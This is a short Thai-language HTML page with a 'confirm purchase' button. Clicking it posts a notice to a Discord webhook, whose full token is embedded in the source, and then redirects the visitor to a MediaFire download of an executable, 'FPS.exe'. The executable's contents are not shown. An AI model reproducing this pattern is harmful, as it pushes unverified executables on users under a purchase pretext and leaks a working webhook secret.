<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>รับของ Website</title>
    <style>
        /* Body styling */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ff7e5f, #feb47b); /* Gradient Background */
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #fff;
        }

        /* Container style */
        .container {
            text-align: center;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 40px 60px;
            border-radius: 25px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            max-width: 400px;
        }

        h1 {
            font-size: 30px;
            font-weight: bold;
            color: #fff;
        }

        p {
            font-size: 16px;
            margin-bottom: 20px;
            color: #ddd;
        }

        /* Button styling */
        button {
            padding: 12px 30px;
            font-size: 18px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 50px; /* Fully rounded */
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
        }

        button:hover {
            background-color: #218838;
            transform: translateY(-3px); /* Slight lift effect */
            box-shadow: 0px 6px 15px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(2px); /* Pressed button effect */
        }

        /* Footer style */
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #bbb;
        }

        .footer a {
            color: #fff;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s ease;
        }

        .footer a:hover {
            color: #feb47b;
        }

    </style>
</head>
<body>

    <div class="container">
        <h1>รับของ Website</h1>
        <p>คลิกปุ่มเพื่อยืนยันการซื้อสินค้า</p>
        
        <button id="orderButton">รับของ Website</button>

        <div class="footer">
            <p>Powered by <a href="https://img5.pic.in.th/file/secure-sv1/11zon_cropped2ffc1554059c904a.png" target="_blank">Your Company</a></p>
        </div>
    </div>

    <script>
        document.getElementById("orderButton").addEventListener("click", function() {
            // ข้อมูลที่จะส่งไปยัง Discord Webhook
            const orderData = {
                username: "ลูกค้าไม่ทราบชื่อ", // ชื่อผู้ใช้
                avatar_url: "https://img5.pic.in.th/file/secure-sv1/11zon_cropped2ffc1554059c904a.png", // รูปโปรไฟล์
                embeds: [
                    {
                        title: "[+] ลูกค้าไม่ทราบชื่อ กดซื้อรับของแล้ว",
                        description: "ลูกค้าไม่ทราบชื่อได้กดซื้อสินค้าเรียบร้อยแล้ว",
                        color: 7506394, // สีของ Embed
                        footer: {
                            text: "ขอบคุณที่สั่งซื้อ!"
                        }
                    }
                ]
            };

            // URL ของ Webhook Discord ที่ต้องการส่งข้อมูล
            const webhookUrl = 'https://discordapp.com/api/webhooks/1370434796743954503/1b-BJ7a_1vGuOo4azpOHQ0Wsvbdy26p4CU3KILzr3ze-z1SaYQGkpZYr5yyHXBK_pLZH';

            // ส่งข้อมูลไปยัง Discord Webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(orderData)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Webhook sent successfully:', data);
                alert('ลูกค้าไม่ทราบชื่อ กดซื้อรับของแล้ว!');
            })
            .catch(error => {
                console.error('Error sending webhook:', error);
                alert('ได้รับของเป็นที่เรียบร้อยรับไฟล์ไปโลดๆ');
            });

            // หลังจากกดปุ่ม, ให้พาไปที่ลิงก์ดาวน์โหลดทันที
            setTimeout(function() {
                window.location.href = "https://www.mediafire.com/file/iodxs3s09dmoj06/FPS.exe/file";
            }, 500); // พาไปลิงก์หลังจากการทำงานเสร็จใน 0.5 วินาที
        });
    </script>

</body>
</html>
